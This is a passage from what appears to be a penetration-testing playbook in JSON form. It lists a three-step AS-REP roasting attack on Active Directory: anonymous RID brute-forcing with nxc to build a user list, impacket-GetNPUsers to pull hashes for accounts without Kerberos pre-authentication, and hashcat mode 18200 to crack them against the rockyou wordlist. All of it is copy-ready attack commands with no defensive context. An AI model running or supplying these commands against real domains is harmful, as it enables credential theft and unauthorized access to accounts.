        "description": "Accounts with pre-auth disabled → get hash without creds",
        "steps": [
            {
                "step": 1,
                "note": "Build user list first (RID brute or LDAP)",
                "command": "nxc smb <ip> -u anonymous -p '' --rid-brute 5000 | grep SidTypeUser | awk '{print $6}' | cut -d'\\\\' -f2 > users.txt"
            },
            {
                "step": 2,
                "note": "AS-REP roast — get hashes for pre-auth disabled accounts",
                "command": "impacket-GetNPUsers '<domain>/' -no-pass -usersfile users.txt -dc-ip <dc_ip> | grep -v KDC_ERR_C_PRINCIPAL_UNKNOWN"
            },
            {
                "step": 3,
                "note": "Crack with hashcat",
                "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
            }
